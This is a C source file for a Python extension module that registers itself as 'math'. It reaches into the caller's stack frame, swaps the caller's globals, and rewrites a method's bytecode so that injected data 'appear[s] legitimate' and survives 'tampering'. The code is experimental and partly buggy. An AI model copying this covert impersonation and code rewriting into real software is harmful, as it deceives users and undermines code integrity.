/*
 ============================================================================
 Name        : MemModC.c
 Author      : Ali
 ============================================================================
 */

#include <Python.h>
#include <stdio.h>
#include <stdlib.h>
#include <frameobject.h>
#include <moduleobject.h>

#define errorCheck() if(PyErr_Occurred()){ printf("Error at line %d\n", __LINE__); PyErr_Print(); }

#define appendList(list, item) appendToList(list, item);errorCheck()

static PyObject *bPlay = NULL;

static PyObject *LOAD_GLOBAL = NULL;

static PyObject *LOAD_CONST = NULL;

static PyObject *LOAD_FAST = NULL;

static PyObject *CALL_FUNCTION = NULL;

static PyObject *RETURN_VALUE = NULL;

static PyObject *STORE_MAP = NULL;

static PyObject *STORE_FAST = NULL;

static PyObject *STORE_SUBSCR = NULL;

static PyObject *BUILD_MAP = NULL;

static PyObject *BUILD_LIST = NULL;

static PyObject *SetLineno = NULL;

static PyObject *inspect = NULL;

static void objType(PyObject *obj, char *name)
{
	printf("Type of %s: %s\n", name, obj->ob_type->tp_name);
}

static void importOps()
{
	PyObject *byteplay = PyImport_ImportModule("byteplay3");
	Py_XINCREF(byteplay);
	bPlay = byteplay;

	LOAD_GLOBAL = PyObject_GetAttrString(bPlay, "LOAD_GLOBAL");
	Py_XINCREF(LOAD_GLOBAL);

	LOAD_CONST = PyObject_GetAttrString(bPlay, "LOAD_CONST");
	Py_XINCREF(LOAD_CONST);

	CALL_FUNCTION = PyObject_GetAttrString(bPlay, "CALL_FUNCTION");
	Py_XINCREF(CALL_FUNCTION);

	RETURN_VALUE = PyObject_GetAttrString(bPlay, "RETURN_VALUE");
	Py_XINCREF(RETURN_VALUE);

	STORE_MAP = PyObject_GetAttrString(bPlay, "STORE_MAP");
	Py_XINCREF(STORE_MAP);
	
	STORE_SUBSCR = PyObject_GetAttrString(bPlay, "STORE_SUBSCR");
	Py_XINCREF(STORE_SUBSCR);

	LOAD_FAST = PyObject_GetAttrString(bPlay, "LOAD_FAST");
	Py_XINCREF(LOAD_FAST);

	BUILD_MAP = PyObject_GetAttrString(bPlay, "BUILD_MAP");
	Py_XINCREF(BUILD_MAP);

	BUILD_LIST = PyObject_GetAttrString(bPlay, "BUILD_LIST");
	Py_XINCREF(BUILD_LIST);

	SetLineno = PyObject_GetAttrString(bPlay, "SetLineno");
	Py_XINCREF(SetLineno);

	STORE_FAST = PyObject_GetAttrString(bPlay, "STORE_FAST");
	Py_XINCREF(STORE_FAST);
}

static void walkBackFrames(PyObject *currentFrame)
{
	printf("Pointer at start: %p\n", currentFrame);


	PyObject *ptr = currentFrame;
	int i;
	for(i=0; i<3;i++)
	{
		PyObject *prev = ((PyFrameObject *) ptr)->f_back;

		if(prev != NULL)
		{
			printf("%d frame back\n", i+1);
			PyObject *code2 = ((PyFrameObject *) prev)->f_code;

			printf("code first lineno: %d\n", ((PyCodeObject *) code2)->co_firstlineno);

			PyObject *consts = ((PyCodeObject *) code2)->co_consts;

			int numConsts = PyTuple_Size(consts);
			if(PyErr_Occurred())
			{
				PyErr_Print();
			}
			int j;
			for(j = 0; j<numConsts; j++)
			{
				PyObject *obj = PyTuple_GetItem(consts, i);
				if(PyErr_Occurred())
				{
					PyErr_Print();
				}

				printf("%s\n", obj->ob_type->tp_name);
			}

			ptr = prev;
		}
		else
		{
			puts("no back frame");
			break;
		}
	}

	printf("Pointer at end: %p\n", currentFrame);
}

/*
* custom list append function for use in macro, to allow for accurate line tracing when
* debugging
*/
static int appendToList(PyObject *list, PyObject *item)
{
	PyList_Append(list, item);
	if(PyErr_Occurred())
		return -1;
	else
		return 0;
}


//talk about how i go about building the code list. create example function, grab opcodes from that etc
static PyObject* buildData(PyObject *data, PyObject *existing)
{
	//need the start of the existing bytecode, saves recreating
	PyObject *newCode = PyList_GetSlice(existing, 0, 6);
	//PyList_Append(newCode, PyList_GetItem(existing, 0));
	appendList(newCode, PyList_GetItem(existing, 0))
	//PyList_Append(newCode, Py_BuildValue("(Ol)", BUILD_MAP, PyDict_Size(data)));
	appendList(newCode, Py_BuildValue("(Ol)", BUILD_MAP, PyDict_Size(data)))

	PyObject *key, *value, *internalKey, *internalValue;
	Py_ssize_t index = 0;
	Py_ssize_t internalIndex = 0;
	Py_ssize_t dummyIndex;

	//TODO CONVERT ALL INTS TO PYSIZE WHERE NECESSARY

	//recreate the data in situ
	while(PyDict_Next(data, &index, &key, &value))
	{
		PyObject* hostData = value;
		PyObject *map;
		for (internalIndex = 0; internalIndex < PyList_Size(hostData); internalIndex++)
		{
			map = PyList_GetItem(hostData, internalIndex);
			//PyList_Append(newCode, Py_BuildValue("(Ol)", BUILD_MAP, PyDict_Size(map)));
			appendList(newCode, Py_BuildValue("(Ol)", BUILD_MAP, PyDict_Size(map)))

			dummyIndex = 0;
			while(PyDict_Next(map, &dummyIndex, &internalKey, &internalValue))
			{
				//PyList_Append(newCode, Py_BuildValue("(OO)", LOAD_CONST, internalValue));
				appendList(newCode, Py_BuildValue("(OO)", LOAD_CONST, internalValue))
				//PyList_Append(newCode, Py_BuildValue("(OO)", LOAD_CONST, internalKey));
				appendList(newCode, Py_BuildValue("(OO)", LOAD_CONST, internalKey))
				//PyList_Append(newCode, Py_BuildValue("(Os)", STORE_MAP, NULL));
				appendList(newCode, Py_BuildValue("(Os)", STORE_MAP, NULL))
				Py_XINCREF(internalValue);
				Py_XINCREF(internalKey);
			}

		}
		//PyList_Append(newCode, Py_BuildValue("(Ol)", BUILD_LIST, PyList_Size(hostData)));
		appendList(newCode, Py_BuildValue("(Ol)", BUILD_LIST, PyList_Size(hostData)))
		//PyList_Append(newCode, Py_BuildValue("(OO)", LOAD_CONST, key));
		appendList(newCode, Py_BuildValue("(OO)", LOAD_CONST, key))
		//PyList_Append(newCode, Py_BuildValue("(Os)", STORE_MAP, NULL));
		appendList(newCode, Py_BuildValue("(Os)", STORE_MAP, NULL))
	}

	//PyList_Append(newCode, Py_BuildValue("(Os)", STORE_FAST, "data"));
	appendList(newCode, Py_BuildValue("(Os)", STORE_FAST, "data"))
	
	//add new data to the existing object state
	//PyList_Append(newCode, Py_BuildValue("(Os)", LOAD_FAST, "data"));
	appendList(newCode, Py_BuildValue("(Os)", LOAD_FAST, "data"))
	//PyList_Append(newCode, Py_BuildValue("(Os)", LOAD_FAST, "state"));
	appendList(newCode, Py_BuildValue("(Os)", LOAD_FAST, "state"))
	//PyList_Append(newCode, Py_BuildValue("(Os)", LOAD_CONST, "data"));
	appendList(newCode, Py_BuildValue("(Os)", LOAD_CONST, "data"))
	//PyList_Append(newCode, Py_BuildValue("(Os)", STORE_SUBSCR, NULL));
	appendList(newCode, Py_BuildValue("(Os)", STORE_SUBSCR, NULL))	
	
	//sandwich the end of the existing code onto new code to return state
	_PyList_Extend(newCode, PyList_GetSlice(existing, 7, PyList_Size(existing)));
	errorCheck()
	
	Py_XINCREF(newCode);
	return newCode;
}

static PyObject* parse(PyObject *self, PyObject *args)
{
	PyObject *data;
	char *hostname;

	if(!PyArg_ParseTuple(args, "Os", &data, &hostname))
	{
		PyErr_Print();
	}

	PyObject *insp = PyImport_ImportModule("inspect");
	errorCheck()
	Py_XINCREF(insp);
	inspect = insp;

	importOps();

	PyObject *currentFrame = PyObject_GetAttrString(inspect, "currentframe");
	
	PyObject *frame = PyObject_Call(currentFrame, Py_BuildValue("()"), NULL);
	
	PyObject *info = PyObject_Call(PyObject_GetAttrString(inspect, "getframeinfo"), Py_BuildValue("(O)", frame), NULL);

	int j;
	PyObject *obj = PyTuple_GetItem(info, 0);
	errorCheck()
	
	PyFrame_FastToLocals(frame);
	PyObject *locals = ((PyFrameObject *)frame)->f_locals;
	errorCheck()

	PyObject *storage = PyDict_GetItemString(locals, "self");
	
	//store the data in order to at least appear legitimate
	PyObject *storageData = PyObject_GetAttrString(storage, "data");
	PyDict_SetItemString(storageData, hostname, data);
	PyObject_SetAttrString(storage, "data", storageData);
	errorCheck()
	
	//now modify existing __getstate__ method to preserve data in case of tampering
	
	PyObject *dummy = PyMethod_GET_FUNCTION(PyObject_GetAttrString(storage, "__getstate__"));
	Py_XINCREF(dummy);
	
	PyObject *bPlayCodeObj = PyObject_GetAttrString(bPlay, "Code");
	errorCheck()
	PyObject *fromCode = PyObject_GetAttrString(bPlayCodeObj, "from_code");
	errorCheck()

	PyObject *tmpCodeObj = PyObject_Call(fromCode, Py_BuildValue("(O)", ((PyFunctionObject *) dummy)->func_code), NULL);

	//create new bytecode sequence
	PyObject *getState = buildData(storageData, PyObject_GetAttrString(tmpCodeObj, "code"));

	int i = PyObject_SetAttrString(tmpCodeObj, "code", getState);
	if(i<0)
	{
		puts("Error");
	}

	PyObject *argList = Py_BuildValue("()", NULL);
	errorCheck()
	PyObject *newCodeObj = PyObject_CallMethod(tmpCodeObj, "to_code", "()", argList);
	errorCheck()

	//assign new code object
	((PyFunctionObject *) dummy)->func_code = newCodeObj;
	Py_XINCREF(newCodeObj);
	
	Py_RETURN_NONE;
}

static void fcreate(char *filepath, char* data)
{
	FILE *fp;

	fp = fopen(filepath, "w+");
	fprintf(fp, "%s", data);

	fclose(fp);
}

static PyObject* disconnect(PyObject *self, PyObject *args)
{
	fcreate("/tmp/yo.txt", "hell naw");

	Py_RETURN_NONE;
}

static PyObject* myrandom(PyObject *self, PyObject *args)
{
	PyObject *insp = PyImport_ImportModule("inspect");
	if(PyErr_Occurred())
	{
		PyErr_Print();
	}
	Py_XINCREF(insp);
	inspect = insp;
	
	importOps();
	
	PyObject *currentFrame = PyObject_GetAttrString(inspect, "currentframe");
	
	PyObject *frame = PyObject_Call(currentFrame, Py_BuildValue("()"), NULL);
	
	PyObject *info = PyObject_Call(PyObject_GetAttrString(inspect, "getframeinfo"), Py_BuildValue("(O)", frame), NULL);

	int j;
	PyObject *obj = PyTuple_GetItem(info, 0);
	if(PyErr_Occurred())
	{
		PyErr_Print();
	}

	PyFrame_FastToLocals(frame);
	PyObject *locals = ((PyFrameObject *)frame)->f_locals;
	
	PyObject *globals = ((PyFrameObject *)frame)->f_globals;
	Py_INCREF(globals);
	
	PyObject *math = PyDict_GetItemString(globals, "math");
	
	PyObject *glob = PyDict_GetItemString(globals, "glob");
	
	Py_INCREF(math);
	
	PyObject *dict = PyModule_GetDict(math);
	
	PyDict_SetItemString(dict, "__doc__", glob);
	
	PyDict_SetItemString(globals, "glob", math);
	
	Py_RETURN_NONE;
}
	
static PyObject* pyfcreate(PyObject *self, PyObject *args)
{
	char *name;

	if(!PyArg_ParseTuple(args, "s", &name))
	{
		PyErr_Print();
	}
	
	fcreate(name, "TEST");
	
	
	Py_RETURN_NONE;
}

static PyObject* ga(PyObject *self, PyObject *args)
{
	return PyLong_FromLong(231234);
}

static PyMethodDef MemModMethods[] =
{
	{ "pyfcreate",pyfcreate, METH_VARARGS | METH_KEYWORDS,"TEST" },
	{ "parseAndSave",parse, METH_VARARGS | METH_KEYWORDS,"TEST" },
	{ "random",myrandom, METH_VARARGS | METH_KEYWORDS,"TEST" },
	{ "__getattribute__",ga, METH_VARARGS | METH_KEYWORDS,"TEST" },
	{ NULL, NULL, 0, NULL }
};

static struct PyModuleDef memModule =
{
		PyModuleDef_HEAD_INIT,
		"math",	//module name
		NULL, 	//documentation
		-1, //state kept in global variables TODO-what!?
		MemModMethods
};

PyMODINIT_FUNC PyInit_MemModOb(void)
{
	return PyModule_Create(&memModule);
}
